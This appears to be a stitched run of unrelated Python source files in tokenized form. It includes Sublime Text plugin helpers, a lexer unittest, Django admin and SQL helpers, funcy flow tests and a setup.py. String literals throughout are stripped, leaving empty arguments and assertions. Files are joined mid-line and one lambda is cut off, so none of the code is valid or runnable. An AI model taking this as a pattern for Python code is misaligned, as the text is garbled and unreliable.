CMD_SET = \n 
\n 
\n 
def str_to_dict ( s ) : \n 
~~~ """Converts a string like \'one:two three:4\' into a dict with parsed values\n    that\'s suitable to pass as args to obj.run_command.\n    """ \n 
d = { } \n 
els = s . split ( ) \n 
for el in els : \n 
~~~ key , value = el . split ( ) \n 
try : \n 
~~~ d [ ] = eval ( value , { } , { } ) \n 
~~ except NameError : \n 
~~~ d [ ] = value \n 
\n 
~~ ~~ return d \n 
\n 
\n 
~~ def run_ ( cmd ) : \n 
~~~ target , predicate = cmd [ ] , cmd [ ] \n 
\n 
if cmd [ ] : \n 
~~~ if cmd [ ] : \n 
~~~ target . run_command ( ) \n 
~~ return \n 
\n 
~~ cmd_ , _ , args = predicate . partition ( ) \n 
if args : \n 
~~~ args = str_to_dict ( args ) \n 
~~ else : \n 
~~~ args = { } \n 
\n 
~~ if not cmd [ ] : \n 
~~~ target . run_command ( str ( cmd_ ) , args ) \n 
\n 
\n 
~~ ~~ def set_ ( cmd ) : \n 
~~~ target , predicate = cmd [ ] , cmd [ ] \n 
# query \n 
if cmd [ ] : \n 
\n 
# Plot all settings to new buffer and exit. \n 
~~~ if cmd [ ] : \n 
~~~ syntax = os . path . basename ( target . settings ( ) . get ( ) ) \n 
target . run_command ( , { \n 
: syntax , \n 
: predicate \n 
} ) \n 
return \n 
\n 
# No setting by that name. \n 
~~ if not target . settings ( ) . has ( predicate ) : \n 
~~~ sublime . status_message ( \'No setting named "%s" found for this object.\' % predicate ) \n 
return \n 
\n 
# Print single setting. \n 
~~ msg = "%s = %s" % ( predicate , target . settings ( ) . get ( predicate ) ) \n 
sublime . status_message ( msg ) \n 
return \n 
\n 
# execute \n 
~~ try : \n 
~~~ name , _ , value = predicate . partition ( ) \n 
target . settings ( ) . set ( name , eval ( value , { } , { } ) ) \n 
msg = "%s = %s" % ( name , target . settings ( ) . get ( name ) ) \n 
sublime . status_message ( msg ) \n 
~~ except ValueError , e : \n 
~~~ sublime . status_message ( \'Invalid syntax for "set" command.\' ) \n 
raise e \n 
\n 
\n 
~~ ~~ def key_ ( args ) : \n 
~~~ print "Not implemented." import unittest \n 
\n 
~~ from vex . parsers . g_cmd import GlobalLexer \n 
\n 
\n 
class TestGlobalLexer ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . lexer = GlobalLexer ( ) \n 
\n 
~~ def testCanMatchFullPattern ( self ) : \n 
~~~ actual = self . lexer . parse ( ) \n 
self . assertEqual ( actual , [ , ] ) \n 
\n 
~~ def testCanMatchEmtpySearch ( self ) : \n 
~~~ actual = self . lexer . parse ( ) \n 
self . assertEqual ( actual , [ , ] ) \n 
\n 
~~ def testCanEscapeCharactersInSearchPattern ( self ) : \n 
~~~ actual = self . lexer . parse ( ) \n 
self . assertEqual ( actual , [ , ] ) \n 
\n 
~~ def testCanEscapeBackSlashes ( self ) : \n 
~~~ actual = self . lexer . parse ( ) \n 
self . assertEqual ( actual , [ , ] ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
~~ from __future__ import absolute_import \n 
from django . contrib import admin \n 
\n 
from . models import Product , Option \n 
\n 
\n 
admin . site . register ( Product ) \n 
admin . site . register ( Option ) \n 
dict_of = lambda o : { k : getattr ( o , k ) for k in dir ( o ) if not in k and not callable ( getattr ( o \n 
from django . db import connections \n 
\n 
def fetch ( query , params = [ ] , db = ) : \n 
~~~ cursor = connections [ db ] . cursor ( ) \n 
cursor . execute ( query , params ) \n 
return cursor . fetchall ( ) \n 
~~ from time import time \n 
\n 
import pytest \n 
from funcy . flow import * \n 
\n 
\n 
def test_silent ( ) : \n 
~~~ assert silent ( int ) ( 1 ) == 1 \n 
assert silent ( int ) ( ) == 1 \n 
assert silent ( int ) ( ) is None \n 
\n 
assert silent ( str . upper ) ( ) == \n 
\n 
\n 
~~ class MyError ( Exception ) : \n 
~~~ pass \n 
\n 
\n 
~~ def test_ignore ( ) : \n 
~~~ assert ignore ( Exception ) ( raiser ( Exception ) ) ( ) is None \n 
assert ignore ( Exception ) ( raiser ( MyError ) ) ( ) is None \n 
assert ignore ( ( TypeError , MyError ) ) ( raiser ( MyError ) ) ( ) is None \n 
\n 
with pytest . raises ( TypeError ) : \n 
~~~ ignore ( MyError ) ( raiser ( TypeError ) ) ( ) \n 
\n 
~~ assert ignore ( MyError , default = 42 ) ( raiser ( MyError ) ) ( ) == 42 \n 
\n 
\n 
~~ def test_raiser ( ) : \n 
~~~ with pytest . raises ( Exception ) as e : raiser ( ) ( ) \n 
assert e . type is Exception \n 
\n 
with pytest . raises ( MyError ) : raiser ( MyError ) ( ) \n 
with pytest . raises ( MyError ) as e : raiser ( MyError , ) ( ) \n 
assert e . value . args == ( , ) \n 
\n 
with pytest . raises ( MyError ) : raiser ( MyError ( ) ) ( ) \n 
with pytest . raises ( MyError ) : raiser ( MyError ) ( , keyword = ) \n 
\n 
\n 
~~ def test_suppress ( ) : \n 
~~~ with suppress ( Exception ) : \n 
~~~ raise Exception \n 
~~ with suppress ( Exception ) : \n 
~~~ raise MyError \n 
\n 
~~ with pytest . raises ( TypeError ) : \n 
~~~ with suppress ( MyError ) : \n 
~~~ raise TypeError \n 
\n 
~~ ~~ with suppress ( TypeError , MyError ) : \n 
~~~ raise MyError \n 
\n 
\n 
~~ ~~ def test_retry ( ) : \n 
~~~ calls = [ ] \n 
\n 
def failing ( n = 1 ) : \n 
~~~ if len ( calls ) < n : \n 
~~~ calls . append ( 1 ) \n 
raise MyError \n 
~~ return 1 \n 
\n 
~~ with pytest . raises ( MyError ) : failing ( ) \n 
calls = [ ] \n 
assert retry ( 2 , MyError ) ( failing ) ( ) == 1 \n 
calls = [ ] \n 
with pytest . raises ( MyError ) : retry ( 2 , MyError ) ( failing ) ( 2 ) \n 
\n 
\n 
~~ def test_retry_timeout ( ) : \n 
~~~ def failing ( ) : \n 
~~~ raise MyError \n 
\n 
# sleep only between tries, so retry is 11, but sleep summary is ~0.1 sec \n 
~~ start_time = time ( ) \n 
with pytest . raises ( MyError ) : retry ( 11 , MyError , timeout = 0.01 ) ( failing ) ( ) \n 
assert 0.1 < time ( ) - start_time < 0.11 \n 
\n 
# exponential timeout \n 
start_time = time ( ) \n 
with pytest . raises ( MyError ) : retry ( 4 , MyError , timeout = lambda a : 0.01 * 2 ** a ) ( failing ) ( ) \n 
d = time ( ) - start_time \n 
assert 0.07 < d < 0.08 \n 
\n 
\n 
~~ def test_retry_many_errors ( ) : \n 
~~~ calls = [ ] \n 
\n 
def failing ( n = 1 ) : \n 
~~~ if len ( calls ) < n : \n 
~~~ calls . append ( 1 ) \n 
raise MyError \n 
~~ return 1 \n 
\n 
~~ assert retry ( 2 , ( MyError , RuntimeError ) ) ( failing ) ( ) == 1 \n 
calls = [ ] \n 
assert retry ( 2 , [ MyError , RuntimeError ] ) ( failing ) ( ) == 1 \n 
\n 
\n 
~~ def test_fallback ( ) : \n 
~~~ assert fallback ( raiser ( ) , lambda : 1 ) == 1 \n 
with pytest . raises ( Exception ) : fallback ( ( raiser ( ) , MyError ) , lambda : 1 ) \n 
assert fallback ( ( raiser ( MyError ) , MyError ) , lambda : 1 ) == 1 \n 
\n 
\n 
~~ def test_limit_error_rate ( ) : \n 
~~~ calls = [ ] \n 
\n 
@ limit_error_rate ( 2 , 60 , MyError ) \n 
def limited ( x ) : \n 
~~~ calls . append ( x ) \n 
raise TypeError \n 
\n 
~~ with pytest . raises ( TypeError ) : limited ( 1 ) \n 
with pytest . raises ( TypeError ) : limited ( 2 ) \n 
with pytest . raises ( MyError ) : limited ( 3 ) \n 
assert calls == [ 1 , 2 ] \n 
\n 
\n 
~~ def test_post_processing ( ) : \n 
~~~ @ post_processing ( max ) \n 
def my_max ( l ) : \n 
~~~ return l \n 
\n 
~~ assert my_max ( [ 1 , 3 , 2 ] ) == 3 \n 
\n 
\n 
~~ def test_collecting ( ) : \n 
~~~ @ collecting \n 
def doubles ( l ) : \n 
~~~ for i in l : \n 
~~~ yield i * 2 \n 
\n 
~~ ~~ assert doubles ( [ 1 , 2 ] ) == [ 2 , 4 ] \n 
\n 
\n 
~~ def test_once ( ) : \n 
~~~ calls = [ ] \n 
\n 
@ once \n 
def call ( n ) : \n 
~~~ calls . append ( n ) \n 
return n \n 
\n 
~~ call ( 1 ) \n 
call ( 2 ) \n 
assert calls == [ 1 ] \n 
\n 
\n 
~~ def test_once_per ( ) : \n 
~~~ calls = [ ] \n 
\n 
@ once_per ( ) \n 
def call ( n , x = None ) : \n 
~~~ calls . append ( n ) \n 
return n \n 
\n 
~~ call ( 1 ) \n 
call ( 2 ) \n 
call ( 1 , 42 ) \n 
assert calls == [ 1 , 2 ] \n 
\n 
\n 
~~ def test_once_per_args ( ) : \n 
~~~ calls = [ ] \n 
\n 
@ once_per_args \n 
def call ( n , x = None ) : \n 
~~~ calls . append ( n ) \n 
return n \n 
\n 
~~ call ( 1 ) \n 
call ( 2 ) \n 
call ( 1 , 42 ) \n 
assert calls == [ 1 , 2 , 1 ] \n 
call ( 1 ) \n 
assert calls == [ 1 , 2 , 1 ] \n 
~~ from setuptools import setup \n 
\n 
setup ( \n 
name = , \n 
version = , \n 
author = , \n 
author_email = , \n 
\n 
description = , \n 
long_description = open ( ) . read ( ) , \n 
url = , \n 
license = , \n 
\n 
packages = [ , , ] , \n 
install_requires = [ \n 
, \n 
, \n 
] , \n 
\n 
classifiers = [ \n 
, \n 
, \n 
, \n 
, \n 
\n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
) \n 
